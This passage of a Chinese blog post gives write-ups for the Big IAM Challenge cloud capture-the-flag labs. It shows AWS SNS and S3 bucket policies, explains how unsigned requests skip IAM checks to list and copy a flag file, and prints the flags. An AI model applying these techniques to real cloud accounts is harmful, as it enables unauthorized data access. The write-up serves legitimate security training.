“NH5QtaED5M+6wrUQTjq5F58GEWIZ8u+mW4smtnnsNs7tRa4lFrqv53dY16EmfxHz2BhEY2TO46tWVWT+HLCzaq+8Clzb98sjUQNiH9VbYno6iUwp9QcO&#x2F;klI0aupj04mpbQ5JTKVgsE&#x2F;b9oqhCwYiobhYuWp2vGarwSIbcJINZi4gaKQ+6r38Z57vFGGEKrE7rZSUETZzzyZcuIVjItZjqoJvCKTCU2XGzikEx88ZEtgoL02tnIvA7IC&#x2F;TiqnVsTlS0MRpbcvzEMCZT9HYo8+3dwNUj+zktZiUmgkdM6B8NJr7lJ7whg&#x2F;a3M24ujZ3ohoJp3GVngQC8uTHinuhodJA&#x3D;&#x3D;”,<br>  “SigningCertURL” : “<a target="_blank" rel="noopener" href="https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem">https://sns.us-east-1.amazonaws.com/SimpleNotificationService-9c6465fa7f48f5cacd23014631ec1136.pem</a>“<br>}</p>
+<p>点击SubscribeURL确认订阅消息，等待一会即可接收到附带flag的订阅消息</p>
+<p>中间的过程磕磕绊绊，应该是要在vpscurl到证明Url，然后再尝试一次就可以拿到flag了</p>
+<p>拿到{wiz:always-suspect-asterisks}</p>
+<h2 id="lab-4"><a href="#lab-4" class="headerlink" title="lab-4"></a>lab-4</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ForAllValues:StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;aws:PrincipalArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这个是s3，丢给deepseek进行分析</p>
+<p>即任何用户都可以查看存储桶内的所有文件</p>
+<p>但是只有admin用户才可以列出该存储目录files&#x2F;下的文件</p>
+<p>通过–no-sign-request可以跳过iam的身份验证</p>
+<p>然后直接ls下&#x2F;files&#x2F;下的所有文件</p>
+<p>然后再aws s3 cp s3:&#x2F;&#x2F;thebigiamchallenge-admin-storage-abf1321&#x2F;files&#x2F;flag-as-admin.txt &#x2F;tmp&#x2F;1.txt</p>
+<p>然后直接cat &#x2F;tmp&#x2F;1.txt即可拿到了</p>
+<p>同样还有一种方式通过fuzz测试，比如，我们getobjext只能cp某个文件出来，不能拿到整个桶的资源（权限不够）因此可以尝试爆破</p>
+<p>最后也是得到flag</p>
+<p>{wiz:principal-arn-is-not-what-you-think}</p>
+<h2 id="lab-5"><a href="#lab-5" class="headerlink" title="lab-5"></a>lab-5</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;mobileanalytics:PutEvents&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;cognito-sync:*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>如上策略有两个声明，VisualEditor0声明允许向MobileAnalytics服务发送事件数据以及对Cognito  Sync服务执行任何操作，且对这两个服务中的所有资源都可以操作。VisualEditor1声明允许执行GetObject和ListBucket两个操作，来获取wiz-privatefiles存储桶中的对象并列出存储桶中的内容.</p>
+<p>该题稍微难一点，因此全程以复现为准</p>
+<hr>
+<p>拼尽全力，无法战胜</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWS%E4%B8%8A%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">AWS上的服务：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#s3"><span class="toc-number">1.1.</span> <span class="toc-text">s3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqs"><span class="toc-number">1.2.</span> <span class="toc-text">sqs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNS"><span class="toc-number">1.3.</span> <span class="toc-text">SNS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%8A%9F%E8%83%BD"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">启动的服务与功能</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-big-IAM-CTF"><span class="toc-number">2.</span> <span class="toc-text">The big IAM CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-2"><span class="toc-number">2.1.</span> <span class="toc-text">lab-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-3"><span class="toc-number">2.2.</span> <span class="toc-text">lab-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%8A%9F%E8%83%BD-1"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">启动的服务与功能</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-4"><span class="toc-number">2.3.</span> <span class="toc-text">lab-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-5"><span class="toc-number">2.4.</span> <span class="toc-text">lab-5</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/AWS-labs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&text=AWS-labs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&is_video=false&description=AWS-labs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AWS-labs&body=Check out this article: https://hexo.sheep-sys-sudo.top/AWS-labs/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&name=AWS-labs&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/AWS-labs/&t=AWS-labs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
